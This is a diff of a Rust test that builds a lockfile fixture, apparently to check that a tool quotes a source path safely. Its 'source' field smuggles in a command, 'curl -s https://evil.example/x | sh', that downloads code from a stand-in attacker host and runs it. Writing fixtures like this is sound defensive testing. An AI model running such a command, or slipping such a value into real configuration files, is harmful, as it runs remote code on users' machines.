@@ -14,7 +14,7 @@ fn validate_and_the_diagnostics_resource_name_a_lock_sources_path_as_one_shell_w
     let lock = json!({
         "lockfile_version": 1,
         "entries": [{
-            "name": "@acme/tool", "version": "1.0.0", "wasm_hash": "",
+            "name": "@acme/tool", "version": "1.0.0", "wasm_hash": "0".repeat(64),
             "source": "local:tool.wasm && curl -s https://evil.example/x | sh #"
         }]
     });
